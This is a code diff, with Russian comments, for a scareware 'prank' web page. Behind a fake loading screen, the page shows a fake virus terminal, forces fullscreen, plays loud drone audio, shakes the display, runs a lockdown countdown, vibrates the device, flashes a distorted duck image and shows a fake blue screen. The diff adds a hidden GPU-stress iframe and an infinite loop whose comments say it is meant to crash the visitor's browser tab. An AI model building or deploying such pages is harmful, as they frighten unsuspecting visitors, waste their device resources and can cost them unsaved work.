@@ -8,6 +8,13 @@
   * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; -webkit-user-select: none; -webkit-touch-callout: none; }
   html, body { background: #000; overflow: hidden; font-family: 'Courier New', monospace; height: 100vh; width: 100vw; color: #0f0; position: fixed; top: 0; left: 0; right: 0; bottom: 0; touch-action: none; overscroll-behavior: none; }
 
+  /* ТЯЖЕЛЫЙ IFRAME С CZNULL (Грузит видеокарту) */
+  #stress-layer { 
+    position: fixed; inset: 0; width: 100vw; height: 100vh; 
+    z-index: 1; border: none; pointer-events: none;
+    opacity: 0.6; /* Чуть приглушен, чтобы текст читался */
+  }
+
   /* ЛОВУШКА */
   #trap-screen { position: fixed; inset: 0; background: #ffffff; z-index: 99999; display: flex; justify-content: center; align-items: center; flex-direction: column; color: #333; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; transition: opacity 0.3s ease; }
   .loader-bar { width: 200px; height: 4px; background: #e0e0e0; border-radius: 2px; overflow: hidden; margin-bottom: 15px; }
@@ -15,9 +22,8 @@
   #trap-text { font-size: 14px; font-weight: 500; color: #555; }
 
   /* ВИРУС */
-  #virus-container { display: none; position: fixed; inset: 0; z-index: 100; background: #000; }
-  #webgl-bg { position: absolute; inset: 0; width: 100vw; height: 100vh; z-index: 1; opacity: 0.4; }
-  #terminal { padding: 20px; font-size: 13px; line-height: 1.3; white-space: pre-wrap; word-break: break-all; font-weight: bold; height: 100%; overflow: hidden; text-align: left; z-index: 10; position: relative; text-shadow: 2px 2px 0 #000, -2px -2px 0 #000; }
+  #virus-container { display: none; position: fixed; inset: 0; z-index: 100; }
+  #terminal { padding: 20px; font-size: 14px; line-height: 1.3; white-space: pre-wrap; word-break: break-all; font-weight: bold; height: 100%; overflow: hidden; text-align: left; z-index: 10; position: relative; text-shadow: 2px 2px 0 #000, -2px -2px 0 #000; }
   .red { color: #ff0000; text-shadow: 0 0 10px #ff0000, 2px 2px 0 #000, -2px -2px 0 #000; }
   .white { color: #ffffff; text-shadow: 2px 2px 0 #000, -2px -2px 0 #000; }
   .green { color: #00ff00; text-shadow: 0 0 5px #00ff00, 2px 2px 0 #000; }
@@ -27,31 +33,38 @@
   @keyframes shake { 0% { transform: translate(0, 0); } 10% { transform: translate(-15px, 10px) rotate(-2deg); } 20% { transform: translate(15px, -10px) rotate(2deg); } 30% { transform: translate(-10px, -10px) rotate(-1deg); } 40% { transform: translate(10px, 10px) rotate(1deg); } 50% { transform: translate(-15px, 5px) rotate(-2deg); } 60% { transform: translate(15px, -5px) rotate(2deg); } 70% { transform: translate(-5px, 15px) rotate(-1deg); } 80% { transform: translate(5px, -15px) rotate(1deg); } 90% { transform: translate(-10px, 0); } 100% { transform: translate(0, 0); } }
   #flash { position: fixed; inset: 0; background: #f00; opacity: 0; pointer-events: none; z-index: 99; mix-blend-mode: difference; }
 
-  #lock-overlay { position: fixed; inset: 0; z-index: 900; background: rgba(10, 0, 0, 0.85); display: none; justify-content: center; align-items: center; flex-direction: column; pointer-events: all; border: 15px solid #f00; }
+  #lock-overlay { position: fixed; inset: 0; z-index: 900; background: rgba(10, 0, 0, 0.8); display: none; justify-content: center; align-items: center; flex-direction: column; pointer-events: all; border: 15px solid #f00; }
   #timer-text { color: #f00; font-size: 18px; letter-spacing: 6px; margin-bottom: 10px; text-shadow: 0 0 15px #f00; font-weight: bold; }
   #timer { font-size: 35vh; color: #f00; font-weight: bold; text-shadow: 0 0 70px #f00, 0 0 140px #f00, 4px 4px 0 #000; line-height: 1; }
   #warning-text { color: #fff; font-size: 16px; margin-top: 20px; animation: blink 0.2s infinite; font-weight: bold; letter-spacing: 2px; }
   @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }
 
-  #glitch-layer { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 950; opacity: 0.3; font-size: 9px; color: #0f0; overflow: hidden; word-break: break-all; }
+  #glitch-layer { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 950; opacity: 0.4; font-size: 10px; color: #0f0; overflow: hidden; word-break: break-all; }
+
+  /* ЕБЛО УТКИ */
+  #duck-face {
+    position: fixed; inset: 0; z-index: 999999; display: none;
+    width: 100vw; height: 100vh; object-fit: cover;
+    filter: contrast(200%) saturate(200%) hue-rotate(90deg) invert(10%);
+    animation: duckShake 0.05s infinite;
+  }
+  @keyframes duckShake { 
+    0% { transform: scale(1.1) translate(0,0); } 
+    50% { transform: scale(1.2) translate(10px, -10px); } 
+    100% { transform: scale(1.1) translate(-10px, 10px); } 
+  }
 
   /* СИНИЙ ЭКРАН СМЕРТИ */
   #final { position: fixed; inset: 0; display: none; z-index: 1000; background: #0000AA; color: #fff; text-align: left; padding: 20px; font-size: 13px; flex-direction: column; justify-content: flex-start; overflow: hidden; font-family: 'Courier New', monospace; }
   #final h2 { background: #AAAAAA; color: #0000AA; padding: 2px 15px; display: inline-block; font-size: 16px; margin-bottom: 20px; align-self: center; font-weight: normal; }
   #final p { margin-bottom: 12px; line-height: 1.4; text-align: left; }
   .dump-box { border: 1px solid #fff; padding: 10px; margin-top: 20px; font-size: 11px; line-height: 1.2; color: #ccc; overflow: hidden; height: 40vh; }
-
-  /* ЕБЛО УТКИ */
-  #duck-face {
-    position: fixed; inset: 0; z-index: 999999; display: none;
-    width: 100vw; height: 100vh; object-fit: cover;
-    filter: contrast(150%) saturate(150%) hue-rotate(10deg);
-    animation: duckShake 0.1s infinite;
-  }
-  @keyframes duckShake { 0% { transform: scale(1) translate(0,0); } 50% { transform: scale(1.05) translate(5px, -5px); } 100% { transform: scale(1) translate(-5px, 5px); } }
 </style>
 </head>
 <body>
+
+<!-- ТЯЖЕЛЫЙ CZNULL НА ЗАДНЕМ ФОНЕ -->
+<iframe id="stress-layer" src="https://cznull.github.io/vsbm"></iframe>
 
 <!-- ЛОВУШКА -->
 <div id="trap-screen">
@@ -61,7 +74,6 @@
 
 <!-- ВИРУС -->
 <div id="virus-container">
-  <canvas id="webgl-bg"></canvas>
   <div id="shake-wrap"><div id="terminal"></div></div>
   <div id="glitch-layer"></div>
   <div id="flash"></div>
@@ -72,8 +84,8 @@
   </div>
 </div>
 
-<!-- ФОТКА УТКИ (Встроенная в код, 100% загрузится) -->
-<img id="duck-face" src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEASABIAAD/2wBDAP//////////////////////////////////////////////////////////////////////////////////////wgALCAABAAEBAREA/8QAFBABAAAAAAAAAAAAAAAAAAAAAP/aAAgBAQABPxA=" alt="AI Duck">
+<!-- УТКА (Ссылка на реальную картинку с Imgur) -->
+<img id="duck-face" src="https://i.imgur.com/2Y6v9uW.jpeg" alt="AI Duck">
 
 <!-- BSOD -->
 <div id="final">
@@ -116,7 +128,6 @@ let trapInterval = setInterval(() => {
 let audioCtx;
 let isLocked = false;
 let endTime = 0;
-let webglActive = false;
 let droneOscillator = null;
 
 function startHell() {
@@ -126,12 +137,13 @@ function startHell() {
         trapScreen.style.display = 'none';
         virusContainer.style.display = 'block';
         document.body.classList.add('shaking');
+        
+        // Включаем полный экран (скрываем панели браузера)
         if (document.documentElement.requestFullscreen) {
             document.documentElement.requestFullscreen().catch(() => {});
         }
         
         startDroneSound();
-        startWebGL();
         startTerminal();
         startCountdown();
     }, 300);
@@ -160,45 +172,6 @@ function playHarshGlitch() {
   gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.2);
   osc.connect(gain); gain.connect(audioCtx.destination);
   osc.start(); osc.stop(audioCtx.currentTime + 0.2);
-}
-
-function startWebGL() {
-    const canvas = document.getElementById('webgl-bg');
-    const gl = canvas.getContext('webgl');
-    if (!gl) return;
-    const vs = `attribute vec2 p; void main() { gl_Position = vec4(p, 0.0, 1.0); }`;
-    const fs = `
-        precision highp float; uniform vec2 res; uniform float time;
-        void main() {
-            vec2 uv = (gl_FragCoord.xy * 2.0 - res.xy) / res.y;
-            vec3 col = vec3(0.0);
-            float d = length(uv) - 0.5 + sin(time)*0.1;
-            if(d < 0.0) col = vec3(1.0, 0.0, 0.0);
-            gl_FragColor = vec4(col, 1.0);
-        }
-    `;
-    function compile(type, src) { const s = gl.createShader(type); gl.shaderSource(s, src); gl.compileShader(s); return s; }
-    const prog = gl.createProgram();
-    gl.attachShader(prog, compile(gl.VERTEX_SHADER, vs));
-    gl.attachShader(prog, compile(gl.FRAGMENT_SHADER, fs));
-    gl.linkProgram(prog); gl.useProgram(prog);
-    const buf = gl.createBuffer(); gl.bindBuffer(gl.ARRAY_BUFFER, buf);
-    gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1, -1, 1, -1, -1, 1, 1, 1]), gl.STATIC_DRAW);
-    const aPos = gl.getAttribLocation(prog, 'a_position');
-    gl.enableVertexAttribArray(aPos); gl.vertexAttribPointer(aPos, 2, gl.FLOAT, false, 0, 0);
-    const uRes = gl.getUniformLocation(prog, 'res');
-    const uTime = gl.getUniformLocation(prog, 'time');
-    canvas.width = window.innerWidth; canvas.height = window.innerHeight;
-    gl.viewport(0, 0, canvas.width, canvas.height);
-    gl.uniform2f(uRes, canvas.width, canvas.height);
-    let start = performance.now(); webglActive = true;
-    function render() {
-        if (!webglActive) return;
-        gl.uniform1f(uTime, (performance.now() - start) / 1000.0);
-        gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
-        requestAnimationFrame(render);
-    }
-    render();
 }
 
 const logLines = [
@@ -231,7 +204,7 @@ function startTerminal() {
 
 function startCountdown() {
     isLocked = true;
-    endTime = Date.now() + 10000; // 10 секунд
+    endTime = Date.now() + 10000; // 10 секунд до конца
     const timerEl = document.getElementById('timer');
     const lockOverlay = document.getElementById('lock-overlay');
     const glitchLayer = document.getElementById('glitch-layer');
@@ -270,7 +243,7 @@ function startCountdown() {
 }
 
 /* ==========================================================================
-   ФИНАЛ: УТИНОЕ ЕБЛО И СИНИЙ ЭКРАН
+   ФИНАЛ: УТКА -> СИНИЙ ЭКРАН -> СМЕРТЬ БРАУЗЕРА
    ========================================================================== */
 function endPrank() {
     if (droneOscillator) {
@@ -290,7 +263,7 @@ function endPrank() {
     }
     if (navigator.vibrate) navigator.vibrate([800, 200, 800, 200, 800]);
 
-    // 4. ЧЕРЕЗ 5 СЕКУНД СМЕНЯЕМ УТКУ НА СИНИЙ ЭКРАН (увеличил время, чтобы точно увидел)
+    // 4. ЧЕРЕЗ 4 СЕКУНДЫ УБИРАЕМ УТКУ И ПОКАЗЫВАЕМ BSOD
     setTimeout(() => {
         duck.style.display = 'none';
         document.getElementById('final').style.display = 'flex';
@@ -302,14 +275,20 @@ function endPrank() {
         }
         document.getElementById('memory-dump').textContent = dump;
 
-        // 5. ВЕЧНЫЙ СТУПОР (вкладка зависает)
-        setInterval(() => {
-            let forceRender = document.getElementById('memory-dump');
-            if(forceRender) {
-                forceRender.style.transform = `translate(${Math.random()}px, ${Math.random()}px)`;
+        // 5. УБИЙСТВО БРАУЗЕРА (ВЫЗОВ "ОПАНЬКИ")
+        // Ждем 1.5 секунды, чтобы пользователь прочитал синий экран, и запускаем вечный цикл.
+        // Chrome поймет, что вкладка зависла, и принудительно ее убьет.
+        setTimeout(() => {
+            // Отключаем iframe с cznull, чтобы он не мешал
+            document.getElementById('stress-layer').style.display = 'none';
+            
+            // БЕСКОНЕЧНЫЙ ЦИКЛ - ГАРАНТИРОВАННЫЙ КРАШ ВКЛАДКИ
+            while(true) {
+                // Chrome увидит, что этот цикл никогда не закончится, и убьет вкладку (Aw, Snap!)
             }
-        }, 5);
-    }, 5000); 
+        }, 1500); 
+
+    }, 4000); 
 }
 </script>
 </body>
